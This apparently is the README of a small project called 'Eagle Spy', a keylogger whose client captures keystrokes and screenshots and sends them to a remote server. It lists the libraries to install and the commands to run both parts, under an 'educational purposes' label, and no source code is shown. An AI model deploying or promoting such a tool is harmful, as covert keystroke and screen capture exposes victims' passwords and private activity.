# k4_spy

# Eagle Spy - Educational Remote Logger

Created by: kader11000

## Files
- `EagleSpyClient.py`: The client that captures keystrokes and screenshots, sends to server.
- `EagleSpyServer.py`: The server that receives and displays keylogs and screenshots.
- `README.txt`: This file.

## Requirements
Install the required libraries:
```
pip install flask requests pynput pyautogui
```

## Usage

### 1. Run the server:
```
python EagleSpyServer.py 0.0.0.0 5000
```

### 2. Run the client (on another machine or same machine for testing):
```
python EagleSpyClient.py <server-ip> 5000
```

Replace `<server-ip>` with your actual IP or domain name.

Enjoy responsibly for educational purposes.
